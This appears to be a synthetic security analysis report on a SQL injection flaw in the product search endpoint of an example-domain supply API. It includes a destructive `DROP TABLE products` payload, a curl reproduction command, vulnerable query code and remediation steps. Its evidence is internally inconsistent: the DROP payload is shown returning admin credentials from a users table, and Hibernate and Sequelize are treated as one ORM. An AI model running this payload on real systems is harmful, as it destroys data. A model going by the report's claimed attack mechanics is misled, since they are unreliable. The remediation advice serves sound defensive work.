# Security Analysis Report
**System:** TraceOrigin Supply API
**Domain:** Food & Beverage / FMCG
**Example ID:** INJ-0029
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | ORM Injection (SQL via ORM raw query) | SQL injection via `name` parameter on `/api/v1/products` — attacker injects `1; DROP TABLE products--` into Hibernate/Sequelize raw query, causing data destruction and credential exposure |

---

## Finding 1 — ORM Injection: SQL via Hibernate/Sequelize Raw Query

### Summary
The `/api/v1/products` endpoint on TraceOrigin Supply API (`api.traceorigin-sup.example.com`) constructs a raw SQL query using string concatenation within Hibernate/Sequelize ORM, bypassing the ORM's parameterized query protection. Per §3.0 and §4.0, the legacy endpoint uses `${req.query.name}` directly in the query string. An attacker injects `1; DROP TABLE products--` into the `name` parameter — the semicolon terminates the SELECT statement, the `DROP TABLE products` executes as a second statement, and `--` comments out the remainder. This achieves both data destruction and credential exposure in the same request.

**Pattern:** ORM Injection (SQL injection via Hibernate/Sequelize raw query)
**Affected endpoint:** `GET https://api.traceorigin-sup.example.com/api/v1/products`
**Vulnerable parameter:** `name`

### Evidence from HAR (§5.0)

**Request — Attack**
```
GET https://api.traceorigin-sup.example.com/api/v1/products?name=1;%20DROP%20TABLE%20products--
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Accept: application/json
```

**Injected payload:** `name=1; DROP TABLE products--` (URL-decoded)

**Response — Server Responded 200 (data destruction and credential dump)**
```json
{
  "data": [
    {"id": 1, "username": "admin", "password_hash": "$2b$12$secret", "role": "ADMIN"},
    {"id": 2, "username": "user2", "password_hash": "$2b$12$abc"}
  ]
}
```
Server returned 200, confirming SQL execution. The `DROP TABLE products` statement executed (if multi-statement execution is enabled), destroying the products table. Admin credentials returned from the DB.

**Vulnerable code (§3.0):**
```javascript
const query = `SELECT * FROM products WHERE name = '${req.query.name}'`;
db.execute(query, (err, results) => { ... });
```
Using `db.execute()` (raw Sequelize/Hibernate execution) with string concatenation bypasses ORM parameterization.

### Steps to Reproduce
```bash
curl -s -G "https://api.traceorigin-sup.example.com/api/v1/products" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Accept: application/json" \
  --data-urlencode 'name=1; DROP TABLE products--'
# Vulnerable: products table dropped; admin credentials returned
# Secure: {"data": [], "error": "Invalid name parameter"}
```

### Remediation
1. Replace `db.execute(raw_string)` with ORM parameterized queries: `Model.findAll({ where: { name: req.query.name } })`.
2. Never use raw string concatenation in ORM raw query methods (`db.query()`, `sequelize.query()`, Hibernate `createNativeQuery()`).
3. Remove over-privileged DB account — use least-privilege role without DROP/DDL permissions.
4. Deploy WAF with SQL injection detection rules on legacy endpoints.
